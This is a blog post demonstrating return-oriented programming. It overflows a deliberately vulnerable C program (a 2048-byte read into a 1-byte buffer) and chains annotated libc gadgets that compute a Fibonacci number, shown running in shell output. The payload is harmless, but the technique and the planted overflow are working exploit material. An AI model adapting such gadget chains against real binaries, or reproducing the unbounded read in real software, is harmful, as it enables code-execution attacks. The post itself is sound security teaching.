---
layout:     post
title:      "Fibonacci Sequence Using Return Oriented Programming (Stack Smashing Attack)"
date:       2011-10-14 10:00:00 +0200
categories: blog
image       : /img/rop-payload.png
description : "Return Oriented Programming: Implement Fibonacci sequence in a corrupt executable relying on libc"

---

<iframe width="767" height="431" src="https://www.youtube.com/embed/UYRahLtai1o?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
<br />

The basic principles behind Return Oriented Attacks is to attack
vulnerable programs such that no actual code is injected when preforming
the actual attack. This methodology enables the attacker to circumvent
the current security systems such as W^P and DEP. The classical
stack-smashing attacks usually involve buffer overflowing a binary in
such a way that the current stack frame is being overwritten with
injected instructions that are able to change the control flow of the
program. From this point the options are unlimited, starting from the
possibilities to perform bad and malicious calculations up to installing
root-kits and taking full control of the computer.

W^X as a executable space protection concept was able to prevent the
injection of arbitrary instructions by marking writable pages as
non-executable on processors that support that. However the stack on x86
(and many others) contains the return address of each function call
being made. This creates the possibility to construct new computations
by linking together code snippets that end with a `ret` instruction.
Since that particular code is already stored in the executable segments
of the binary the W^X and DEP will not prevent it from running. Since
most of the programs are compiled with huge library providing variety of
functions available to ease the life of the daily programmer, it is very
likely to create a Turing set of instruction to perform virtually any
kind of computation by using a simple library as libc (mostly known as
return-to-libc attacks).  The worst case scenario threat of the ROP
attacks is the fact that they can cause a very serious damage on the
system, in the frame of the binary they target, by executing the
malicious code, and then passing the control to the original binary.
This kind of attacks can be virtually invisible, since technically its
really hard to determine whether the behavior of the targeted binary is
controlled from the outside.

The traditional way of an attacker using ROP is to find a set of gadgets
(set of instructions ending with a “ret” instruction) and chain them
together to execute execve command, and start running a shell. My
opinion is that ROP can go much deeper. I also believe that there is a
way to automatically find the required gadgets to build a complete
Turing set of instructions, and build a whole language on top of it. The
latter one enables creating very sophisticated attacks. In this blog
post I demonstrate a complete transformation of a useless vulnerable
binary into a Fibonacci sequence calculator, using stack smashing
attack. The binary (`dummy.c`):

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	unsigned char buf[1];
	read(0, buf, 2048);
	printf("%c\n", buf[0]);
	return 0;
}
```

Obviously any input greater than 1 character will be possible to create
a Segmentation fault. Since the program is compiled with `gcc`, we can
notice that it is linked with `libc`:

```
astojanov@debian-vbox:~/workspace/fROP$ ldd dummy
	linux-gate.so.1 =>  (0xb7fe4000)
	libc.so.6 => /lib/i686/cmov/libc.so.6 (0xb7e97000)
	/lib/ld-linux.so.2 (0xb7fe5000)
```

In order to craft the attack, gadgets obtained from libc are used. The
simplest approach to find those gadgets is to search for `ret` (`c3`)
blocks, and then go backwards to find proper instructions. In the
current version of `libc` I was able to extract 18419 gadgets:

```
astojanov@debian-vbox:~/workspace/crash/tools/gadgets$ ./gadgets -i 2 -t /lib/i686/cmov/libc.so.6
G: 0xb7ea3830: hexa:"cd 80 |c3" text:"int	$0x80 ; ret	"
G: 0xb7ea3841: hexa:"1c 24 |c3" text:"sbb	$0x24, %al ; ret	"
G: 0xb7ea3840: hexa:"8b 1c 24 |c3" text:"movl	(%esp), %ebx ; ret	"
G: 0xb7ea38b3: hexa:"00 00 |c3" text:"addb	%al, (%eax) ; ret	"
G: 0xb7ea38af: hexa:"8d 81 58 08 00 00 |c3" text:"leal	0x858(%ecx), %eax ; ret	"
G: 0xb7ea38ca: hexa:"5d |c3" text:"pop	%ebp ; ret	"
G: 0xb7ea38c5: hexa:"08 83 40 04 01 5d |c3" text:"orb	%al, 0x5D010440(%ebx) ; ret	"
G: 0xb7ea38da: hexa:"5d |c3" text:"pop	%ebp ; ret	"
G: 0xb7ea38d5: hexa:"08 83 68 04 01 5d |c3" text:"orb	%al, 0x5D010468(%ebx) ; ret	"
G: 0xb7ea39ad: hexa:"5d |c3" text:"pop	%ebp ; ret	"
G: 0xb7ea3a19: hexa:"c9 |c3" text:"leave	 ; ret	"
G: 0xb7ea3a89: hexa:"5d |c3" text:"pop	%ebp ; ret	"
G: 0xb7ea3c84: hexa:"5d |c3" text:"pop	%ebp ; ret	"
G: 0xb7ea401b: hexa:"5d |c3" text:"pop	%ebp ; ret	"
```

Now comes the most interesting part, that is chaining the gadgets together to change the behavior of the program. After closely picking gadgets I have generated my Fibonacci attack using gadgets from libc only:

```
# Specify a byte offset to trigger the buffer overflow in the dummy program.

Offset: 13

# Use registers EDX and EDI as numbers F_n and F_(n+1) in the Fibonacci sequence
# Initialize, such that EDX = 1 and EDI = 2

01: 0xB7F6E16D: hexa:"5a |c3"           text:"pop   %edx ; ret"
02: 0x00000001

03: 0xB7F4CD28: hexa:"5f |c3"           text:"pop   %edi ; ret"
04: 0x00000001

# Use ECX as number N, initialize to N = 10 (0xA). Also put junk value in EBX.

05: 0xB7F6E197: hexa:"59 |5b |c3"       text:"pop   %ecx ; pop	%ebx ; ret"
06: 0x0000000A                                       # return the 10th fibonacci
07: 0xDEADBEEF                                       # junk address

# Decerase N twice, since we already have the two initial numbers.

08: 0xB7F5D116: hexa:"ff c9 |c3"        text:"dec   %ecx ; ret"
09: 0xB7F5D116: hexa:"ff c9 |c3"        text:"dec   %ecx ; ret"

# Start the Fibonacci loop.

10: 0xB7F6E198: hexa:"5b |c3" text:"pop	%ebx ; ret"
11: 0x62A4E2D4         # make sure that instruction 13 writes on the right place

# EDX -> ESI, EDI -> EDX, EDI = EDI + ESI (the Fibonacci magic)

12: 0xB7F0964F: hexa:"89 d6 |c3"        text:"mov   %edx, %esi ; ret"
13: 0xB7F9E479: hexa:"89 fa |ff 83 c4 14 5b 5d |c3" text:"mov	%edi, %edx ; incl 0x5D5B14C4(%ebx) ; ret	"
14: 0xB7EBFF62: hexa:"01 f7 |c2 00 00"  text:"add   %esi, %edi ; ret	$0x0000"

# CF flag is changed when performing a - b. iff a < b then CF = 1 otherwise CF = 0

15: 0xB7F61F8B: hexa:"91 |c2 00 00"     text:"xchg  %ecx,  %eax ; ret	$0x0000"
16: 0xB7F6131A: hexa:"83 e8 01 |c3"     text:"sub   $0x01, %eax ; ret"
17: 0xB7F61F8B: hexa:"91 |c2 00 00"     text:"xchg  %ecx,  %eax ; ret	$0x0000"

# Use LAHF to load the flags into AH. CF flag is represented by the LSB of AH

18: 0xB7F5CD5D: hexa:"9f |c3"           text:"lahf  ; ret"

# AH is already loaded, clean the rest of the bits except for the CF flag

19: 0xB7F65659: hexa:"25 00 01 00 00 |c3" text:"and	$0x00000100, %eax ; ret	"

# Arithmetic shift - 4 bits right, so EAX gets value of 0 or 64, according to CF

20: 0xB7EF5D47: hexa:"c1 f8 02 |c3"     text:"sar   $0x02, %eax ; ret"

# Due to lack of proper gadgets, we need to execute several gadgets to change
# the value of ESP. The EPS gets added into EBX: ESP -> EBP, EBP -> EBX. This
# is why EBP is initialized to 0. EBX is initialized to 0x14 = 10, explanation
# follows bellow.

21: 0xB7F82DD3: hexa:"5d |c3"           text:"pop   %ebp ; ret"
22: 0x00000000                                                # Load value of 00
23: 0xB7F6E198: hexa:"5b |c3"           text:"pop   %ebx ; ret"
24: 0x00000014                                                # Load value of 20

# Note that ESP gets added into EBP on instruction 25 and gets the stack address
# of that instruction. In order to do the conditional jump, we use the value of
# EAX to modify the ESP. Since EAX holds the value of 64 or 0, we can add EAX to
# ESP. This will result in either going to the next instruction, or 64 / 4 = 16
# instructions later. Since we need 5 instructions after ESP is added to actually
# modify the value, we need to offset ESP for 5 more instructions. We do this by
# initializing EBX to 5x4 = 20 (0x14) (instruction 24).

25: 0xB7F3CBC2: hexa:"03 ec |c3"        text:"add   %esp, %ebp ; ret "
26: 0xb7ff5e6a: hexa:"01 eb |c3"        text:"add   %ebp, %ebx ; ret "
27: 0xB7F61F8B: hexa:"91 |c2 00 00"     text:"xchg  %ecx, %eax ; ret $0x0000"
28: 0xB7F60B8C: hexa:"01 d9 |c3"        text:"add   %ebx, %ecx ; ret "
29: 0xB7F61F8B: hexa:"91 |c2 00 00"     text:"xchg  %ecx, %eax ; ret $0x0000"
30: 0xB7FCD854: hexa:"94 |c2 00 00"     text:"xchg  %esp, %eax ; ret $0x0000"

# If we've managed to reach so far, that means that CF was 0 on instruction 16.
# This also means that our representation of the N number, which gets decreased
# on every iteration (inst 15 - 17), is greater or equal to 1. We need to jump
# back. Note that EBX still holds the value of ESP+0x14 obtained at instruction
# 26. Therefore we need to jump back to instruction 10. Therefore, we need to
# decrease ESP for 16 instructions, and subtract the offset of 0x14. That is:
# 16x4 + 0x14 = 84 = 0x54. We load -0x54 in EAX and use the same trick to modify
# the value of ESP.

31: 0xB7F64321: hexa:"58 |c3"           text:"pop   %eax       ; ret"
32: 0x00000054                                                # Load value of 84
33: 0xB7F9E996: hexa:"f7 d8 |c3"        text:"neg   %eax       ; ret"
34: 0xB7F61F8B: hexa:"91 |c2 00 00"     text:"xchg  %ecx, %eax ; ret $0x0000"
35: 0xB7F60B8C: hexa:"01 d9 |c3"        text:"add   %ebx, %ecx ; ret "
36: 0xB7F61F8B: hexa:"91 |c2 00 00"     text:"xchg  %ecx, %eax ; ret $0x0000"
37: 0xB7FCD854: hexa:"94 |c2 00 00"     text:"xchg  %esp, %eax ; ret $0x0000"

# ESP will never point to this part of the stack. Therefore, since it is a free
# space, we can use it to display a message on the screen stating that Fibonacci
# sequence has been completed.

38: 0x6f626946: "Fibo"
39: 0x6363616e: "nacc"
40: 0x6f642069: "i do"
41: 0x202e656e: "ne. "
42: 0x206e7552: "Run "
43: 0x6f686365: "echo"
44: 0x0a3f2420: " $?\n"
45: 0x00000000: ""
46: 0x00000000:

# If instruction 47 is reached, that means that N is 0, and we are done with the
# Fibonacci sequence. The last thing left is to somehow reproduce the result.
# The first thing we do is call sys_write system call, and we inform the user
# that calculation of Fibonacci has completed.

# According to http://bluemaster.iu.hio.no/edu/dark/lin-asm/syscalls.html
# ECX is set to the address of instruction 38, that is EBP which has the value
# from instruction 25, and 12 instruction in between 12x4 = 0x30.

47: 0xB7F6E197: hexa:"59 |5b |c3"       text:"pop   %ecx ; pop	%ebx ; ret	"
48: 0x00000030
49: 0x00000000
50: 0xb7ff5e6a: hexa:"01 eb |c3"        text:"add   %ebp, %ebx ; ret "
51: 0xB7F60B8C: hexa:"01 d9 |c3"        text:"add   %ebx, %ecx ; ret "

# EBX is set to 1 (so it writes to the standard output) and EDX is set to 29,
# which is 0x1d, representing the size of the string being written. EAX must be
# set to 1, to represent the proper system call, that is sys_write

52: 0xB7F4C31E: hexa:"5b |c3"           text:"pop   %ebx ; ret	"
53: 0x00000001
54: 0xB7F6E16D: hexa:"5a |c3"           text:"pop   %edx ; ret"
55: 0x0000001d
56: 0xB7F64321: hexa:"58 |c3"           text:"pop   %eax ; ret"
57: 0x00000004

# The system call is issued.

58: 0xb7fe3830: hexa:"cd 80 |c3"        text:"int   $0x80 ; ret"

# Finally transfer the value of EDI (the n-th Fibonacci) and write it to the
# exit code of the program. We use the same rules as explined before.

59: 0xB7F6E198: hexa:"5b |c3" text:"pop	%ebx ; ret"
60: 0x62A4E2D4
61: 0xB7F9E479: hexa:"89 fa |ff 83 c4 14 5b 5d |c3" text:"mov	%edi, %edx ; incl 0x5D5B14C4(%ebx) ; ret	"
62: 0xB7F518C2: hexa:"89 d3 |c3"        text:"mov %edx, %ebx ; ret"
63: 0xb7ff8efc: hexa:"31 c0 |c3"        text:"xor   %eax, %eax ; ret"  # eax = 0
64: 0xb7fe82c3: hexa:"40 |c3"           text:"inc   %eax       ; ret"  # eax = 1

# ROP program exits.

65: 0xb7fe3830: hexa:"cd 80 |c3"        text:"int   $0x80      ; ret"

```

Finally I used a “packer” to pack all the gadget addresses into a payload file which looks like this:

<div style="max-width: 560px; margin: auto">
    <br />
    <img src="/img/rop-payload.png"  />
    <br />
    <br />
</div>

Feeding this payload into the dummy file leads to the following output (89, the 10th Fibonacci is returned in the exit signal of the program):

```
astojanov@debian-vbox:~/workspace/fROP$ ./dummy < payload.bin
x
Fibonacci done. Run echo $?
astojanov@debian-vbox:~/workspace/fROP$ echo $?
89
```